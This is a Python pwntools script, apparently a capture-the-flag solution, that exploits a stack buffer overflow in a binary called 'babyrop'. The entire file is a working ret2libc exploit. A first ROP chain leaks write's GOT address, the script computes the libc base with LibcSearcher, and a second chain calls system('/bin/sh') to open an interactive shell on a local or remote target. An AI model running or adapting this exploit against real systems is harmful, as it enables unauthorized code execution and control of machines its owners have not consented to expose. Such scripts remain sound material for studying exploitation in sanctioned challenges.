from pwn import *
from LibcSearcher import *

context.arch = 'amd64'
context.log_level = 'debug'

if args['REMOTE']:
    io = remote('IP',port)
else:
    io = process('./babyrop')

elf = ELF('./babyrop')
padding = 0x70 + 8
pop_rdi_ret = 0x0000000000401343
pop_rsi_r15_ret = 0x0000000000401341
pop_rdx_ret = 0x000000000040121a
ret_add = 0x000000000040101a

payload = flat(
        [
            cyclic(padding),
            pop_rdi_ret,
            1,
            pop_rsi_r15_ret,
            elf.got['write'],
            0,
            pop_rdx_ret,
            8,
            elf.plt['write'],
            elf.sym['vuln'],
        ]
)

io.sendlineafter(b'flow?\n',payload)
write_add = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success(f'write_add ==> {hex(write_add)}')

if args['REMOTE']:
    libc = LibcSearcher('write',write_add)
    base_add = write_add - libc.dump('write')
    system_add = base_add + libc.dump('system')
    bin_sh_add = base_add + libc.dump('str_bin_sh')
else:
    libc = elf.libc
    base_add = write_add - libc.sym['write']
    system_add = base_add + libc.sym['system']
    bin_sh_add = base_add + next(libc.search(b'/bin/sh'))

payload = flat(
        [
            cyclic(padding),
            pop_rdi_ret,
            bin_sh_add,
            system_add,
        ]
)

io.sendlineafter(b'flow?\n',payload)
io.interactive()
